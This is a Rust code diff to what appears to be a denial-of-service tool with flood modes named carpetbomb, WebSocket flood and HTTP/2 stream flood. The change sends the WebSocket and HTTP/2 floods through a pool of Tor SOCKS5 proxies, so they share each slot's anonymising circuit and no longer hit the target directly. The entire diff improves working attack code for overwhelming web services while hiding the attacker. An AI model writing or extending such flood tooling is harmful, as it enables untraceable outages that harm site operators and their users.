@@ -164,6 +164,13 @@ impl ProxyPool {
         Some((idx, self.clients[idx].clone()))
     }
 
+    /// Return the SOCKS5 proxy URL associated with pool slot `idx` (for modes
+    /// that dial their own connection — websocket/h2 — so they stay on the same
+    /// Tor circuit as the HTTP requests from this slot).
+    pub(crate) fn proxy_for(&self, idx: usize) -> Option<String> {
+        self.labels.get(idx).cloned()
+    }
+
     pub(crate) fn report_success(&mut self, idx: usize, latency_ms: u64) {
         if idx < self.clients.len() {
             self.succeeded[idx] = true;
@@ -1302,12 +1309,20 @@ pub(crate) async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::M
                             fetch_carpetbomb(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                         }
                         AttackMode::WebSocketFlood => {
-                            // Real WS handshake + 100 binary frames per tick (direct to target).
-                            fetch_websocket_flood(target.clone(), req_delay, verbose, insecure, 100).await
+                            // Real WS handshake + 100 binary frames per tick (through the same Tor circuit as HTTP requests from this slot).
+                            let proxy_url = match pool_clone.lock() {
+                                Ok(guard) => guard.proxy_for(idx),
+                                Err(e) => { eprintln!("  Pool lock poisoned: {}", e); None }
+                            };
+                            fetch_websocket_flood(target.clone(), req_delay, verbose, insecure, 100, proxy_url.as_deref()).await
                         }
                         AttackMode::H2StreamFlood => {
-                            // Real HTTP/2 multiplexing: 50 concurrent streams per tick (direct to target).
-                            fetch_h2_stream_flood(target.clone(), req_delay, verbose, insecure, 50).await
+                            // Real HTTP/2 multiplexing: 50 concurrent streams per tick (through the same Tor circuit as HTTP requests from this slot).
+                            let proxy_url = match pool_clone.lock() {
+                                Ok(guard) => guard.proxy_for(idx),
+                                Err(e) => { eprintln!("  Pool lock poisoned: {}", e); None }
+                            };
+                            fetch_h2_stream_flood(target.clone(), req_delay, verbose, insecure, 50, proxy_url.as_deref()).await
                         }
                     };
                     let latency = start_req.elapsed().as_millis() as u64;
